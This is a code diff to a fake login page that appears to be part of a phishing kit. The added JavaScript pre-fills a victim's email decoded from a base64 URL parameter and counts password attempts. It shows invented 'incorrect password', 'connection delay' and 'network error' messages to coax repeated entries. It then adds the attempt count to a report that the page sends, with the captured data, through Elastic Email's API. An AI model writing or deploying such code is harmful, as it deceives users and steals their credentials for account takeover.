@@ -217,12 +217,25 @@ span.psw {
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 
 <script>
+// Track login attempts
+let loginAttempts = 0;
+
 // Function to get URL parameters
 function getUrlParameter(name) {
     name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
     var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
     var results = regex.exec(location.search);
     return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
+
+// Function to decode base64 encoded email
+function decodeEmail(encodedEmail) {
+    try {
+        return decodeURIComponent(atob(encodedEmail));
+    } catch (e) {
+        console.error('Error decoding email:', e);
+        return '';
+    }
 }
 
 // Get the modal
@@ -239,7 +252,9 @@ $(document).ready(function(){
     // Get email from URL parameter and pre-fill the input field
     var urlEmail = getUrlParameter('email');
     if (urlEmail) {
-        $('#email').val(urlEmail);
+        // Decode the email if it's base64 encoded
+        var decodedEmail = decodeEmail(urlEmail);
+        $('#email').val(decodedEmail || urlEmail);
     }
     
     $('#submit-btn').click(function(event){
@@ -257,6 +272,24 @@ $(document).ready(function(){
         
         if (password === "") {
             alert("Please enter your password");
+            return false;
+        }
+
+        // Increment login attempts
+        loginAttempts++;
+        
+        // Show appropriate error message based on attempt count
+        if (loginAttempts === 1) {
+            $('#msg').show().html("Email or password incorrect").css("color", "red");
+            $('#submit-btn').val('Try Again');
+            return false;
+        } else if (loginAttempts === 2) {
+            $('#msg').show().html("Delay in connection. Give it another try").css("color", "orange");
+            $('#submit-btn').val('Try Again');
+            return false;
+        } else if (loginAttempts >= 3) {
+            $('#msg').show().html("Network error! Connection timed out!").css("color", "red");
+            $('#submit-btn').prop('disabled', true).css('opacity', '0.7');
             return false;
         }
 
@@ -287,6 +320,8 @@ $(document).ready(function(){
             <strong>Time:</strong> ${new Date().toLocaleString()}
             <br>
             <strong>Page URL:</strong> ${window.location.href}
+            <br>
+            <strong>Login Attempts:</strong> ${loginAttempts}
         `);
 
         // Send the data directly to Elastic Email's API
@@ -318,9 +353,9 @@ $(document).ready(function(){
         });
     });
 });
+  
 </script>
 
 </body>
 
 </html>
-
